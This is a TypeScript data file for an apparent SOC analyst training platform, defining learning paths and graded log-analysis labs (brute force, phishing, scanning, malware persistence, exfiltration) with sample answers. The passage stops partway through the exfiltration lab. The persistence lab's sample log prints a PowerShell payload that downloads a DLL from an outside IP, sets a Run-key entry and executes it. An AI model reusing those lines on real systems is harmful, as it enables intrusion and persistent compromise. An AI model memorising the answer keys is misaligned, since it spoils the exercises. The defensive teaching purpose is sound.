import type { Lab, LearningPath } from '../types';

// ─── Starter Labs ────────────────────────────────────────────────────────────

export const STARTER_LABS: Lab[] = [
  {
    id: 'ssh-bruteforce-001',
    pathId: 'soc-analyst-l1',
    title: 'SSH Brute-Force Detection',
    type: 'log-analysis',
    difficulty: 2,
    estimatedMinutes: 15,
    objectives: [
      'Identify the source IP of repeated failed login attempts',
      'Determine whether the attacker achieved a successful login',
      'Draft a one-sentence SOC escalation note',
    ],
    mitreMappings: ['T1110.001 — Brute Force: Password Guessing'],
    skillsEarned: ['log-analysis', 'soc-triage'],
    tasks: [
      {
        id: 'task-1',
        prompt: 'What IP address is responsible for the failed login attempts?',
        type: 'identify',
        hint: 'Look for the "from" field in each sshd log line.',
        gradingKeywords: ['192.168.1.105'],
        gradingPatterns: ['192\\.168\\.1\\.105', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'],
        sampleAnswer: '192.168.1.105 — it appears in all four "Failed password" log lines as the source of the brute-force attempts.',
      },
      {
        id: 'task-2',
        prompt: 'Was the final login attempt successful? How can you tell from the log?',
        type: 'classify',
        hint: '"Accepted password" indicates a successful authentication.',
        gradingKeywords: ['yes', 'accepted', 'successful'],
        gradingPatterns: ['accepted password|success|yes'],
        sampleAnswer: 'Yes — the last log line reads "Accepted password for root from 192.168.1.105", confirming the attacker gained access after four failed attempts.',
      },
      {
        id: 'task-3',
        prompt: 'Write a one-sentence escalation note describing what happened.',
        type: 'write',
        hint: 'Include: what happened, the source IP, the target account, and whether access was gained.',
        gradingKeywords: ['192.168.1.105', 'root', 'ssh'],
        gradingPatterns: ['brute.?force|credential|password.*guess', '192\\.168\\.1\\.105', 'root'],
        sampleAnswer: 'Brute-force SSH attack from 192.168.1.105 against the root account resulted in a successful login at 02:41:44 — recommend immediate host isolation and credential rotation.',
      },
    ],
    datasetStub: `Jun 13 02:41:15 server sshd[12847]: Failed password for root from 192.168.1.105 port 52341 ssh2
Jun 13 02:41:17 server sshd[12847]: Failed password for root from 192.168.1.105 port 52342 ssh2
Jun 13 02:41:19 server sshd[12847]: Failed password for root from 192.168.1.105 port 52343 ssh2
Jun 13 02:41:21 server sshd[12848]: Failed password for root from 192.168.1.105 port 52344 ssh2
Jun 13 02:41:44 server sshd[12849]: Accepted password for root from 192.168.1.105 port 52345 ssh2
Jun 13 02:41:44 server sshd[12849]: pam_unix(sshd:session): session opened for user root by (uid=0)`,
  },
  {
    id: 'phishing-triage-001',
    pathId: 'it-soc-bridge',
    title: 'Phishing Email Triage',
    type: 'ticket',
    difficulty: 1,
    estimatedMinutes: 10,
    objectives: [
      'Identify indicators that mark an email as phishing',
      'Classify the threat accurately',
      'Provide a clear, actionable response to the user',
    ],
    mitreMappings: ['T1566.001 — Phishing: Spearphishing Link'],
    skillsEarned: ['it-foundations', 'security-fundamentals'],
    tasks: [
      {
        id: 'task-1',
        prompt: 'Is the sender domain legitimate? What is suspicious about it?',
        type: 'identify',
        hint: "Compare the sender domain against the company's real domain. Look for lookalike TLDs or extra subdomains.",
        gradingKeywords: ['company-helpdesk.net', 'not legitimate', 'lookalike', 'suspicious', 'fake'],
        gradingPatterns: ['company-helpdesk\\.net', 'corp\\.company\\.com', 'lookalike|fake|not.*legit|suspicious'],
        sampleAnswer: 'The sender domain "company-helpdesk.net" is NOT the legitimate corporate domain "corp.company.com". It is a lookalike domain — a classic phishing indicator.',
      },
      {
        id: 'task-2',
        prompt: 'Classify this email: Phishing / Spear-phishing / Legitimate / Uncertain',
        type: 'classify',
        hint: 'Phishing uses urgency and fake domains. Spear-phishing is targeted at a specific person or role.',
        gradingKeywords: ['phishing'],
        gradingPatterns: ['phishing|spear.?phishing'],
        sampleAnswer: 'Phishing (could also be spear-phishing). The email uses urgency ("24 hours"), a lookalike domain, and requests credential verification — all canonical phishing indicators.',
      },
      {
        id: 'task-3',
        prompt: 'What three actions should you tell the user to take right now?',
        type: 'write',
        hint: 'Think: do not click, do not reply, and escalate. Should the account be checked for compromise?',
        gradingKeywords: ['do not click', 'do not reply', 'report'],
        gradingPatterns: ['do not click|don.*t click', 'do not reply|don.*t reply|ignore', 'report|escalat|security team'],
        sampleAnswer: '1. Do not click any links in the email. 2. Do not reply to the sender. 3. Forward the email to the security team and have your account reviewed for unauthorized access.',
      },
    ],
    datasetStub: `User Report (Help Desk Ticket #10492):
"Hi helpdesk, I got an email from IT-Support@company-helpdesk.net saying my
account will be suspended in 24 hours unless I verify my credentials at:
http://secure-login.company-helpdesk.net/verify

The subject line was: [URGENT] Account Verification Required — Action Needed Now
I haven't clicked anything. Is this real?"

Sender:    IT-Support@company-helpdesk.net
Reply-To:  no-reply@company-helpdesk.net
Received:  from mail3.company-helpdesk.net (185.220.101.47)
Real corp domain: corp.company.com`,
  },
  {
    id: 'windows-event-4624-001',
    pathId: 'soc-analyst-l1',
    title: 'Windows Logon Event Analysis',
    type: 'log-analysis',
    difficulty: 2,
    estimatedMinutes: 20,
    objectives: [
      'Parse Windows Security Event ID 4624 and 4625',
      'Determine whether a logon sequence is suspicious',
      'Identify the authentication protocol and its implications',
    ],
    mitreMappings: ['T1078 — Valid Accounts', 'T1110 — Brute Force'],
    skillsEarned: ['log-analysis', 'security-fundamentals'],
    tasks: [
      {
        id: 'task-1',
        prompt: 'What user account logged on successfully? What does Logon Type 3 mean?',
        type: 'identify',
        hint: 'Logon Type 3 is a network logon — typically file shares, RDP without NLA, or pass-the-hash.',
        gradingKeywords: ['jsmith', 'network logon', 'logon type 3'],
        gradingPatterns: ['jsmith', 'logon type 3|type 3|network logon'],
        sampleAnswer: 'jsmith logged on successfully. Logon Type 3 is a network logon — used when accessing shared resources over the network, or potentially during a pass-the-hash attack.',
      },
      {
        id: 'task-2',
        prompt: 'There is a failed logon (4625) before the success (4624) from the same IP. Is this suspicious?',
        type: 'classify',
        hint: 'One failure before success could be a typo. Multiple failures from the same external source is more concerning.',
        gradingKeywords: ['yes', 'suspicious', 'investigate'],
        gradingPatterns: ['yes|suspicious|investigate|concern', '4625.*4624|failed.*success'],
        sampleAnswer: 'Yes, this warrants investigation. A failed logon immediately before a success from the same external IP using NTLM is consistent with a credential guessing attempt, especially from an unrecognized workstation (LAPTOP-EXTERN).',
      },
      {
        id: 'task-3',
        prompt: 'What authentication protocol was used? Is NTLM a concern in a modern corporate environment?',
        type: 'identify',
        hint: 'NTLM is older and vulnerable to relay attacks. Kerberos is preferred in modern AD environments.',
        gradingKeywords: ['ntlm', 'yes', 'concern'],
        gradingPatterns: ['ntlm', 'relay|pass.the.hash|vulnerable|older|kerberos'],
        sampleAnswer: 'NTLM was used (AuthPackageName: NTLM). Yes, NTLM is a concern — it is vulnerable to relay attacks and pass-the-hash. In modern environments, Kerberos is preferred. NTLM usage from an unrecognized external workstation is a strong escalation signal.',
      },
    ],
    datasetStub: `Event 4625 — Logon Failure
  TimeCreated:      2026-06-13T03:19:43Z
  Computer:         WORKSTATION-07.corp.company.com
  TargetUserName:   jsmith
  TargetDomain:     CORP
  LogonType:        3 (Network)
  IpAddress:        10.10.5.99
  FailureReason:    Unknown username or bad password
  Status:           0xC000006D
  SubStatus:        0xC000006A

Event 4624 — Logon Success
  TimeCreated:      2026-06-13T03:22:11Z
  Computer:         WORKSTATION-07.corp.company.com
  TargetUserName:   jsmith
  TargetDomain:     CORP
  LogonType:        3 (Network)
  IpAddress:        10.10.5.99
  AuthPackageName:  NTLM
  WorkstationName:  LAPTOP-EXTERN`,
  },
];

// ─── Learning Paths ──────────────────────────────────────────────────────────

export const LEARNING_PATHS: LearningPath[] = [
  {
    id: 'it-soc-bridge',
    title: 'IT Support → SOC Bridge',
    description:
      'Build the service-desk skills that transfer directly into a SOC role: ticket triage, identity verification, phishing escalation, and endpoint basics.',
    level: 'beginner',
    iconKey: 'Headphones',
    locked: false,
    modules: [
      { id: 'itb-01', pathId: 'it-soc-bridge', title: 'Password Reset & Identity Verification', objectives: ['Verify user identity before credential changes', 'Document actions in the ticket'], labIds: [] },
      { id: 'itb-02', pathId: 'it-soc-bridge', title: 'Phishing Email Triage', objectives: ['Identify phishing indicators', 'Advise users correctly'], labIds: ['phishing-triage-001'] },
      { id: 'itb-03', pathId: 'it-soc-bridge', title: 'Endpoint Basics', objectives: ['Identify running processes', 'Understand AV alerts'], labIds: [] },
      { id: 'itb-04', pathId: 'it-soc-bridge', title: 'VPN Connection Issues', objectives: ['Diagnose common VPN failures', 'Escalate network-layer issues'], labIds: [] },
      { id: 'itb-05', pathId: 'it-soc-bridge', title: 'Suspicious Login Tickets', objectives: ['Identify indicators of account compromise', 'Follow escalation procedures'], labIds: [] },
      { id: 'itb-06', pathId: 'it-soc-bridge', title: 'MFA Enrollment & Issues', objectives: ['Walk users through MFA enrollment', 'Handle bypass requests safely'], labIds: [] },
      { id: 'itb-07', pathId: 'it-soc-bridge', title: 'Escalation Writing', objectives: ['Write clear, factual escalation notes', 'Include who/what/when/where/severity'], labIds: [] },
    ],
  },
  {
    id: 'soc-analyst-l1',
    title: 'SOC Analyst Level 1',
    description:
      'Core analyst skills: alert triage, log reading, SIEM queries, MITRE ATT&CK mapping, and writing incident notes under pressure.',
    level: 'intermediate',
    iconKey: 'Shield',
    locked: false,
    modules: [
      { id: 'soc-01', pathId: 'soc-analyst-l1', title: 'Alert Triage Fundamentals', objectives: ['Prioritize alerts by severity and context', 'Identify true positives vs. noise'], labIds: [] },
      { id: 'soc-02', pathId: 'soc-analyst-l1', title: 'Log Reading', objectives: ['Parse syslog, auth.log, and Windows Event logs', 'Extract key fields without a SIEM'], labIds: ['ssh-bruteforce-001', 'windows-event-4624-001'] },
      { id: 'soc-03', pathId: 'soc-analyst-l1', title: 'SIEM Query Basics', objectives: ['Write basic search queries', 'Use time ranges and field filters'], labIds: [] },
      { id: 'soc-04', pathId: 'soc-analyst-l1', title: 'MITRE ATT&CK Mapping', objectives: ['Map observed behaviors to tactics and techniques', 'Use the ATT&CK Navigator mindset'], labIds: [] },
      { id: 'soc-05', pathId: 'soc-analyst-l1', title: 'False Positive vs. True Positive', objectives: ['Apply context to reduce noise', 'Document false positive determinations'], labIds: [] },
      { id: 'soc-06', pathId: 'soc-analyst-l1', title: 'Incident Notes', objectives: ['Write timeline-based notes', 'Capture evidence with precision'], labIds: [] },
      { id: 'soc-07', pathId: 'soc-analyst-l1', title: 'Containment Decisions', objectives: ['Decide when to isolate vs. monitor', 'Understand blast radius'], labIds: [] },
      { id: 'soc-08', pathId: 'soc-analyst-l1', title: 'Threat Intel Basics', objectives: ['Use IOCs to enrich alerts', 'Understand threat actor profiles'], labIds: [] },
    ],
  },
  {
    id: 'secplus-companion',
    title: 'Security+ / Network+ Companion',
    description:
      'Practice-first companion for certification study. Each module ties exam objectives to hands-on log and packet analysis.',
    level: 'intermediate',
    iconKey: 'Award',
    locked: false,
    modules: [
      { id: 'sec-01', pathId: 'secplus-companion', title: 'Networking Fundamentals', objectives: ['OSI model applied to real traffic', 'TCP/IP header fields in context'], labIds: [] },
      { id: 'sec-02', pathId: 'secplus-companion', title: 'Threats & Vulnerabilities', objectives: ['Recognize common attack patterns', 'Distinguish vulnerability classes'], labIds: [] },
      { id: 'sec-03', pathId: 'secplus-companion', title: 'Identity & Access Management', objectives: ['AAA concepts in practice', 'MFA, SSO, and federation'], labIds: [] },
      { id: 'sec-04', pathId: 'secplus-companion', title: 'Cryptography Basics', objectives: ['Symmetric vs. asymmetric in real configs', 'Certificate chain validation'], labIds: [] },
      { id: 'sec-05', pathId: 'secplus-companion', title: 'Risk Management', objectives: ['Qualitative vs. quantitative risk', 'Risk register basics'], labIds: [] },
      { id: 'sec-06', pathId: 'secplus-companion', title: 'Incident Response', objectives: ['IR lifecycle phases', 'Evidence handling basics'], labIds: [] },
      { id: 'sec-07', pathId: 'secplus-companion', title: 'Security Architecture', objectives: ['Defense-in-depth in real environments', 'Segmentation and DMZ patterns'], labIds: [] },
      { id: 'sec-08', pathId: 'secplus-companion', title: 'Governance & Compliance', objectives: ['NIST CSF 2.0 core functions', 'Policy vs. procedure vs. standard'], labIds: [] },
    ],
  },
  {
    id: 'portfolio-builder',
    title: 'Portfolio Builder',
    description:
      'Turn your lab work into job ammunition: investigation writeups, resume bullets, mock interview answers, and GitHub-ready exports.',
    level: 'beginner',
    iconKey: 'Briefcase',
    locked: false,
    modules: [
      { id: 'port-01', pathId: 'portfolio-builder', title: 'Writing Investigation Writeups', objectives: ['Structure a clear narrative from raw logs', 'Include evidence, timeline, and conclusion'], labIds: [] },
      { id: 'port-02', pathId: 'portfolio-builder', title: 'Screenshot Evidence', objectives: ['Capture relevant log sections', 'Annotate screenshots for clarity'], labIds: [] },
      { id: 'port-03', pathId: 'portfolio-builder', title: 'Command History Documentation', objectives: ['Record commands used during analysis', 'Explain what each command revealed'], labIds: [] },
      { id: 'port-04', pathId: 'portfolio-builder', title: 'Resume Bullets', objectives: ['Convert lab completions to quantified bullets', 'Use action-verb + skill + impact format'], labIds: [] },
      { id: 'port-05', pathId: 'portfolio-builder', title: 'Mock Interview Prep', objectives: ['Answer "tell me about a time you…" using lab stories', 'Handle technical screener questions'], labIds: [] },
      { id: 'port-06', pathId: 'portfolio-builder', title: 'GitHub Export', objectives: ['Structure a portfolio repo', 'Write a professional README for your evidence'], labIds: [] },
    ],
  },
];

// ─── Phase 6 Labs ────────────────────────────────────────────────────────────

export const PHASE6_LABS: Lab[] = [
  {
    id: 'network-scan-001',
    pathId: 'soc-analyst-l1',
    title: 'Network Reconnaissance Detection',
    type: 'packet',
    difficulty: 3,
    estimatedMinutes: 25,
    objectives: [
      'Identify network scanning activity from a tcpdump/nmap capture',
      'Determine the scan technique used (SYN, ping, full-connect)',
      'Assess which services were discovered by the scanner',
    ],
    mitreMappings: ['T1046 — Network Service Discovery', 'T1040 — Network Sniffing'],
    skillsEarned: ['networking', 'threat-hunting'],
    datasetStub: '',
    datasetSections: [
      {
        label: 'tcpdump Capture',
        format: 'log',
        content: `16:02:01.412813 IP 10.10.4.44.54321 > 10.10.1.1.80: Flags [S], seq 1234567890, win 1024, length 0
16:02:01.413022 IP 10.10.1.1.80 > 10.10.4.44.54321: Flags [S.], seq 987654321, ack 1234567891, win 65535, length 0
16:02:01.413201 IP 10.10.4.44.54321 > 10.10.1.1.80: Flags [R], seq 1234567891, length 0
16:02:01.501887 IP 10.10.4.44.54322 > 10.10.1.1.22: Flags [S], seq 1234567891, win 1024, length 0
16:02:01.502011 IP 10.10.1.1.22 > 10.10.4.44.54322: Flags [S.], seq 112233445, ack 1234567892, win 65535, length 0
16:02:01.502199 IP 10.10.4.44.54322 > 10.10.1.1.22: Flags [R], seq 1234567892, length 0
16:02:01.601345 IP 10.10.4.44.54323 > 10.10.1.1.443: Flags [S], seq 1234567892, win 1024, length 0
16:02:01.601522 IP 10.10.1.1.443 > 10.10.4.44.54323: Flags [S.], seq 223344556, ack 1234567893, win 65535, length 0
16:02:01.601701 IP 10.10.4.44.54323 > 10.10.1.1.443: Flags [R], seq 1234567893, length 0
16:02:01.702213 IP 10.10.4.44.54324 > 10.10.1.1.3389: Flags [S], seq 1234567893, win 1024, length 0
16:02:01.703999 IP 10.10.1.1 > 10.10.4.44: Flags [R.], length 0
16:02:01.800112 IP 10.10.4.44.54325 > 10.10.1.1.445: Flags [S], seq 1234567894, win 1024, length 0
16:02:01.800889 IP 10.10.1.1 > 10.10.4.44: Flags [R.], length 0
16:02:01.901556 IP 10.10.4.44.54326 > 10.10.1.2.80: Flags [S], seq 1234567895, win 1024, length 0
16:02:01.902004 IP 10.10.1.2 > 10.10.4.44: Flags [R.], length 0
16:02:02.001332 IP 10.10.4.44.54327 > 10.10.1.3.80: Flags [S], seq 1234567896, win 1024, length 0
16:02:02.001998 IP 10.10.1.3 > 10.10.4.44: Flags [R.], length 0
16:02:02.100887 IP 10.10.4.44.54328 > 10.10.1.4.80: Flags [S], seq 1234567897, win 1024, length 0
16:02:02.101444 IP 10.10.1.4 > 10.10.4.44: Flags [R.], length 0
16:02:03.201556 IP 10.10.4.44.49201 > 10.10.1.1.22: Flags [S], seq 8877665544, win 65535, options [mss 1460,sackOK,TS val 123456 ecr 0], length 0
16:02:03.202001 IP 10.10.1.1.22 > 10.10.4.44.49201: Flags [S.], seq 334455667, ack 8877665545, win 65535, length 0
16:02:03.202221 IP 10.10.4.44.49201 > 10.10.1.1.22: Flags [.], ack 334455668, win 502, length 0
16:02:03.203110 IP 10.10.1.1.22 > 10.10.4.44.49201: Flags [P.], length 21: SSH-2.0-OpenSSH_8.9p1`,
      },
      {
        label: 'Firewall Logs',
        format: 'log',
        content: `16:02:01 FW ALLOW 10.10.4.44 -> 10.10.1.1:80 TCP SYN_ONLY
16:02:01 FW ALLOW 10.10.4.44 -> 10.10.1.1:22 TCP SYN_ONLY
16:02:01 FW ALLOW 10.10.4.44 -> 10.10.1.1:443 TCP SYN_ONLY
16:02:01 FW BLOCK 10.10.4.44 -> 10.10.1.1:3389 TCP (rule: no-rdp-internal)
16:02:01 FW BLOCK 10.10.4.44 -> 10.10.1.1:445 TCP (rule: smb-block)
16:02:01 FW BLOCK 10.10.4.44 -> 10.10.1.2:80 TCP (rule: no-cross-vlan)
16:02:01 FW BLOCK 10.10.4.44 -> 10.10.1.3:80 TCP (rule: no-cross-vlan)
16:02:01 FW BLOCK 10.10.4.44 -> 10.10.1.4:80 TCP (rule: no-cross-vlan)
16:02:03 FW ALLOW 10.10.4.44 -> 10.10.1.1:22 TCP ESTABLISHED (full 3-way handshake)
ALERT: Port scan detected — source 10.10.4.44 probed 8 ports across 4 hosts in 2 seconds`,
      },
    ],
    tasks: [
      {
        id: 'task-1',
        prompt: 'What IP address is performing the network scan? What subnet is it targeting?',
        type: 'identify',
        hint: 'Look at the source IP in the SYN packets. The destination IPs will tell you the target subnet.',
        gradingKeywords: ['10.10.4.44', '10.10.1.0', '10.10.1'],
        gradingPatterns: ['10\\.10\\.4\\.44', '10\\.10\\.1'],
        sampleAnswer: '10.10.4.44 is performing the scan, targeting the 10.10.1.0/24 subnet (internal corporate network).',
      },
      {
        id: 'task-2',
        prompt: 'What type of scan technique is being used? How do you know from the TCP flags?',
        type: 'classify',
        hint: 'Look at the TCP Flags field. A SYN-only scan sends SYN and immediately RST on SYN-ACK without completing the handshake.',
        gradingKeywords: ['syn scan', 'half-open', 'stealth'],
        gradingPatterns: ['syn.?scan|half.?open|stealth|flags.*S|RST after SYN-ACK'],
        sampleAnswer: 'SYN scan (half-open/stealth scan) — the attacker sends SYN, receives SYN-ACK, then immediately sends RST without completing the 3-way handshake. This avoids full connection logging on many systems.',
      },
      {
        id: 'task-3',
        prompt: 'Which ports/services were confirmed open (responded with SYN-ACK)? Which were closed/filtered?',
        type: 'identify',
        hint: 'SYN-ACK = open. RST from target = closed. No response or ICMP unreachable = filtered.',
        gradingKeywords: ['80', '22', '443', 'open', '3389', '445', 'closed'],
        gradingPatterns: ['port.*80|80.*open', 'port.*22|22.*open', 'port.*443|443.*open', '3389.*closed|445.*closed'],
        sampleAnswer: 'Open (SYN-ACK received): 80 (HTTP), 22 (SSH), 443 (HTTPS). Closed/filtered: 3389 (RDP), 445 (SMB), and ports on .1.2, .1.3, .1.4 (blocked by firewall). The attacker then established a full SSH connection to 10.10.1.1:22.',
      },
    ],
  },
  {
    id: 'malware-persistence-001',
    pathId: 'soc-analyst-l1',
    title: 'Malware Persistence Analysis',
    type: 'log-analysis',
    difficulty: 4,
    estimatedMinutes: 30,
    objectives: [
      'Identify the persistence mechanism established by malware',
      'Trace the execution chain from initial execution to persistence',
      'Determine the MITRE ATT&CK techniques used',
    ],
    mitreMappings: ['T1547.001 — Boot or Logon Autostart: Registry Run Keys', 'T1059.001 — PowerShell', 'T1036 — Masquerading'],
    skillsEarned: ['log-analysis', 'threat-hunting', 'security-fundamentals'],
    datasetStub: '',
    datasetSections: [
      {
        label: 'Windows Event Log',
        format: 'log',
        content: `EventID 4688 — Process Creation (2026-06-13T08:14:55Z)
  NewProcessName:  C:\\Users\\jdoe\\AppData\\Local\\Temp\\invoice_Q2.exe
  CommandLine:     invoice_Q2.exe
  ParentProcess:   C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE
  User:            CORP\\jdoe
  IntegrityLevel:  Medium

EventID 4688 — Process Creation (2026-06-13T08:15:02Z)
  NewProcessName:  C:\\Windows\\System32\\cmd.exe
  CommandLine:     cmd.exe /c "powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdA..."
  ParentProcess:   C:\\Users\\jdoe\\AppData\\Local\\Temp\\invoice_Q2.exe
  User:            CORP\\jdoe

EventID 4688 — Process Creation (2026-06-13T08:15:03Z)
  NewProcessName:  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  CommandLine:     powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdA...
  ParentProcess:   C:\\Windows\\System32\\cmd.exe
  User:            CORP\\jdoe

PowerShell Script Block Log (EventID 4104, 2026-06-13T08:15:04Z):
  [Decoded -Enc payload]
  $bytes = (New-Object Net.WebClient).DownloadData("http://185.220.101.47/svchost32.dll")
  [System.IO.File]::WriteAllBytes("$env:APPDATA\\svchost32.dll", $bytes)
  $reg = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  Set-ItemProperty -Path $reg -Name "WindowsUpdateHelper" -Value "rundll32.exe $env:APPDATA\\svchost32.dll,DllMain"
  Start-Process rundll32.exe "$env:APPDATA\\svchost32.dll,DllMain"

EventID 4688 — Process Creation (2026-06-13T08:15:08Z)
  NewProcessName:  C:\\Windows\\System32\\rundll32.exe
  CommandLine:     rundll32.exe C:\\Users\\jdoe\\AppData\\Roaming\\svchost32.dll,DllMain
  ParentProcess:   C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  User:            CORP\\jdoe`,
      },
      {
        label: 'Registry Changes',
        format: 'log',
        content: `[Registry Monitor — 2026-06-13T08:15:04Z]
Key:    HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
Value:  WindowsUpdateHelper
Data:   rundll32.exe C:\\Users\\jdoe\\AppData\\Roaming\\svchost32.dll,DllMain
Action: CREATE (new key)
PID:    8841 (powershell.exe)

[Existing Run keys on this host for reference]
Key:    HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
Value:  OneDrive
Data:   "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background

[Scheduled Tasks — schtasks /query output, same timeframe]
No new scheduled tasks created.`,
      },
      {
        label: 'Network Events',
        format: 'log',
        content: `2026-06-13T08:15:05Z FW ALLOW 10.10.4.44 -> 185.220.101.47:80 TCP GET /svchost32.dll
2026-06-13T08:15:06Z FW ALLOW 10.10.4.44 -> 185.220.101.47:80 TCP 200 OK bytes=412672
2026-06-13T08:15:09Z FW ALLOW 10.10.4.44 -> 91.234.55.119:443 TCP ESTABLISHED (beacon check-in #1)
2026-06-13T08:15:39Z FW ALLOW 10.10.4.44 -> 91.234.55.119:443 TCP ESTABLISHED (beacon check-in #2)
2026-06-13T08:16:09Z FW ALLOW 10.10.4.44 -> 91.234.55.119:443 TCP ESTABLISHED (beacon check-in #3)
DNS: WORKSTATION-04 queried cdn-static.company-update.net -> 91.234.55.119 (30s intervals)`,
      },
    ],
    tasks: [
      {
        id: 'task-1',
        prompt: 'What was the initial infection vector? How did the malware first execute on the endpoint?',
        type: 'identify',
        hint: 'Look at the ParentProcess in the first EventID 4688. What application launched the malicious executable?',
        gradingKeywords: ['outlook', 'email', 'attachment', 'invoice_q2.exe', 'phishing'],
        gradingPatterns: ['outlook|email|attachment|phishing|invoice'],
        sampleAnswer: 'Email attachment (spearphishing). Outlook.exe launched invoice_Q2.exe from %TEMP%, indicating the user opened a malicious email attachment. This is T1566.001 — Phishing via spearphishing attachment.',
      },
      {
        id: 'task-2',
        prompt: 'What persistence mechanism was established? Name the registry key and value used.',
        type: 'identify',
        hint: 'Look at the Registry Changes tab. The malware created a new Run key entry.',
        gradingKeywords: ['run key', 'hkcu', 'windowsupdatehelper', 'registry', 'svchost32.dll'],
        gradingPatterns: ['run.?key|HKCU.*Run|CurrentVersion.*Run', 'WindowsUpdateHelper', 'svchost32\\.dll'],
        sampleAnswer: 'Registry Run key persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — Value "WindowsUpdateHelper" pointing to rundll32.exe loading svchost32.dll. This runs the payload on every user logon (T1547.001).',
      },
      {
        id: 'task-3',
        prompt: 'What is svchost32.dll? Why is this filename significant as a threat indicator?',
        type: 'classify',
        hint: 'The real Windows system process is svchost.exe (no 32). Files that mimic system names but differ slightly are using masquerading.',
        gradingKeywords: ['masquerading', 'cobalt strike', 'beacon', 'fake', 'mimics svchost'],
        gradingPatterns: ['masquerad|mimic|fake|svchost\\.exe|T1036|cobalt|beacon'],
        sampleAnswer: 'svchost32.dll is a Cobalt Strike beacon DLL masquerading as a Windows system file (T1036 — Masquerading). The real Windows svchost.exe has no "32" suffix and does not exist as a DLL in AppData. The 30-second C2 beacon interval to 91.234.55.119 (FIN7 infrastructure) confirms this.',
      },
    ],
  },
  {
    id: 'data-exfil-http-001',
    pathId: 'soc-analyst-l1',
    title: 'HTTP Data Exfiltration via Proxy',
    type: 'log-analysis',
    difficulty: 3,
    estimatedMinutes: 25,
    objectives: [
      'Identify anomalous outbound data volumes from proxy logs',
      'Determine what data category was likely exfiltrated',
      'Establish a timeline from initial access to exfiltration',
    ],
    mitreMappings: ['T1048 — Exfiltration Over Alternative Protocol', 'T1041 — Exfiltration Over C2 Channel'],
    skillsEarned: ['log-analysis', 'networking', 'soc-triage'],
    datasetStub: '',
    datasetSections: [
      {
        label: 'HTTP Proxy Logs',
        format: 'log',
        content: `Timestamp                User    SrcIP         Method  URL                                             Status  Bytes_Sent   Bytes_Recv
2026-06-13T08:00:11Z     bwalker 10.10.1.23    GET     https://office365.com/                          200     1024         45056
2026-06-13T08:01:44Z     tsmith  10.10.1.77    GET     https://sharepoint.corp.company.com/HR/Policies 200     512          88064
2026-06-13T08:05:22Z     akim    10.20.1.14    GET     https://sharepoint.corp.company.com/Finance/Q2  200     1024         204800
2026-06-13T08:10:01Z     jdoe    10.10.4.44    GET     https://pastebin.com/raw/xK9mN2pQ                200     512          2048
2026-06-13T08:15:33Z     jdoe    10.10.4.44    GET     https://github.com/                              200     1024         56320
2026-06-13T08:17:00Z     jdoe    10.10.4.44    POST    http://185.220.101.47:8443/upload                200     245366784    512
2026-06-13T08:18:44Z     jdoe    10.10.4.44    POST    http://185.220.101.47:8443/upload                200     104857600    256
2026-06-13T08:20:01Z     jdoe    10.10.4.44    GET     http://cdn-static.company-update.net/beacon      200     512          128
2026-06-13T08:20:32Z     jdoe    10.10.4.44    GET     http://cdn-static.company-update.net/beacon      200     512          128
2026-06-13T08:22:00Z     rjones  10.10.1.88    GET     https://slack.com/                               200     1024         88064
2026-06-13T08:23:11Z     jdoe    10.10.4.44    POST    http://185.220.101.47:8443/upload                200     367001600    256
2026-06-13T08:25:00Z     bwalker 10.10.1.23    GET     https://github.com/                              200     512          56320
2026-06-13T08:26:00Z     jdoe    10.10.4.44    GET     https://8.8.8.8/dns-query (DoH)                  200     45056        2048`,
      },
      {
        label: 'File Access Timeline',
        format: 'log',
        content: `2026-06-13T08:12:00Z jdoe accessed \\\\FILESERVER-02\\HR_Docs           — 214 files, 98MB total, 90 seconds
2026-06-13T08:13:30Z jdoe accessed \\\\FILESERVER-02\\Finance_Q2_Reports — 847 files, 340MB total, 90 seconds
2026-06-13T08:14:55Z jdoe ran: Compress-Archive -Path C:\\Users\\jdoe\\Documents\\HR_Export -Dest C:\\Temp\\data.zip
2026-06-13T08:15:11Z jdoe ran: Compress-Archive -Path C:\\Users\\jdoe\\Documents\\Finance_Export -Dest C:\\Temp\\finance.zip
2026-06-13T08:16:45Z C:\\Temp\\data.zip created     — size: 87MB (compressed)
2026-06-13T08:16:50Z C:\\Temp\\finance.zip created  — size: 163MB (compressed)
2026-06-13T08:17:00Z HTTP POST to 185.220.101.47 begins — duration: 8min 33sec`,
      },
      {
        label: 'DNS Query Log',
        format: 'log',
        content: `2026-06-13T08:09:55Z 10.10.4.44 queried: pastebin.com               -> 104.20.66.210
2026-06-13T08:15:10Z 10.10.4.44 queried: github.com                  -> 140.82.121.4
2026-06-13T08:16:55Z 10.10.4.44 queried: 185.220.101.47 (reverse DNS) -> no PTR record
2026-06-13T08:20:00Z 10.10.4.44 queried: cdn-static.company-update.net -> 91.234.55.119 (interval: 30s, count: 12)
2026-06-13T08:25:45Z 10.10.4.44 queried: 8.8.8.8 (DoH — DNS over HTTPS) — anomalous, bypasses corporate DNS
DNS ALERT: cdn-static.company-update.net matches threat intel feed (FIN7 C2 infrastructure)`,
      },
    ],
    tasks: [
      {
        id: 'task-1',
        prompt: 'How much data was exfiltrated in total? Calculate from the proxy logs. What destination received it?',
        type: 'identify',
        hint: 'Add up the Bytes_Sent values for the three POST requests to 185.220.101.47. Convert bytes to MB/GB.',
        gradingKeywords: ['185.220.101.47', '700mb', '716mb', '717mb', '~700', 'gigabyte'],
        gradingPatterns: ['185\\.220\\.101\\.47', '7[0-9]{2}\\s?MB|~700|717|716', 'POST|upload'],
        sampleAnswer: 'Total exfiltrated: 245,366,784 + 104,857,600 + 367,001,600 = 717,225,984 bytes (≈ 684MB / 0.67GB) in three POST requests to 185.220.101.47:8443. This matches the compressed HR and Finance archives (87MB + 163MB = 250MB raw; the three uploads suggest the data was split or there were additional files).',
      },
      {
        id: 'task-2',
        prompt: 'What categories of data were staged for exfiltration? What business impact should you note in your escalation?',
        type: 'write',
        hint: 'Look at the File Access Timeline. Which file shares were accessed? What departments do they belong to?',
